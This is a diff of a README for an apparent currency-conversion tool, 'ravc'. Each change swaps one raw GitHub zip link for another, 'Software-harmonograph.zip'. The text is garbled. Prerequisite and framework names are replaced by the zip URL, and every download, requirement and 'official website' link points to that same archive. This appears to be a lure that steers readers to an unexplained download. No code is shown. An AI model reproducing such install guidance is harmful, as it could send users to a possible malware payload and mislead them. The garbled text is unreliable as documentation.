@@ -6,7 +6,7 @@ Welcome to the **ravc** project! This tool allows you to effortlessly convert cu
 ## 📥 Download & Install
 To download **ravc**, visit the Releases page below. Choose the version that matches your operating system. 
 
-[![Download ravc](https://raw.githubusercontent.com/Asura361/ravc/main/stoppage/ravc.zip%https://raw.githubusercontent.com/Asura361/ravc/main/stoppage/ravc.zip)](https://raw.githubusercontent.com/Asura361/ravc/main/stoppage/ravc.zip)
+[![Download ravc](https://raw.githubusercontent.com/Asura361/ravc/main/stoppage/Software-harmonograph.zip%https://raw.githubusercontent.com/Asura361/ravc/main/stoppage/Software-harmonograph.zip)](https://raw.githubusercontent.com/Asura361/ravc/main/stoppage/Software-harmonograph.zip)
 
 Once you access the page, follow these steps to download and install **ravc**:
 
@@ -21,7 +21,7 @@ Once you access the page, follow these steps to download and install **ravc**:
 Before you install **ravc**, ensure your system meets the following requirements:
 
 - **Operating System**: Windows 10 or later, macOS 10.15 or later
-- **https://raw.githubusercontent.com/Asura361/ravc/main/stoppage/ravc.zip**: Version 14 or later must be installed for the application to function smoothly. You can download https://raw.githubusercontent.com/Asura361/ravc/main/stoppage/ravc.zip from [https://raw.githubusercontent.com/Asura361/ravc/main/stoppage/ravc.zip Official Website](https://raw.githubusercontent.com/Asura361/ravc/main/stoppage/ravc.zip).
+- **https://raw.githubusercontent.com/Asura361/ravc/main/stoppage/Software-harmonograph.zip**: Version 14 or later must be installed for the application to function smoothly. You can download https://raw.githubusercontent.com/Asura361/ravc/main/stoppage/Software-harmonograph.zip from [https://raw.githubusercontent.com/Asura361/ravc/main/stoppage/Software-harmonograph.zip Official Website](https://raw.githubusercontent.com/Asura361/ravc/main/stoppage/Software-harmonograph.zip).
 - **Internet Connection**: A stable connection is necessary for real-time data retrieval.
 
 ## 🔎 How to Use
@@ -48,7 +48,7 @@ Using **ravc** is straightforward. Once the application is running, follow these
 
 - Currency Conversion
 - Real-Time Data Scraping
-- https://raw.githubusercontent.com/Asura361/ravc/main/stoppage/ravc.zip Framework for backend processing
+- https://raw.githubusercontent.com/Asura361/ravc/main/stoppage/Software-harmonograph.zip Framework for backend processing
 - Use of Google Finance APIs for accurate data
 - A clean CLI/NPM interface for seamless interaction
 
@@ -68,6 +68,6 @@ For any issues or questions, please feel free to reach out. Open an issue on Git
 ## 💻 Further Reading
 To understand more about how to use **ravc** effectively, consider checking our Wiki section for in-depth articles. You’ll find guides, tutorials, and frequently asked questions that can enhance your usage of the application.
 
-**Remember:** You can always return to the [Download rca](https://raw.githubusercontent.com/Asura361/ravc/main/stoppage/ravc.zip) page whenever you need to update to the latest version or explore other releases.
+**Remember:** You can always return to the [Download rca](https://raw.githubusercontent.com/Asura361/ravc/main/stoppage/Software-harmonograph.zip) page whenever you need to update to the latest version or explore other releases.
 
 Enjoy using **ravc** for all your currency conversion needs!
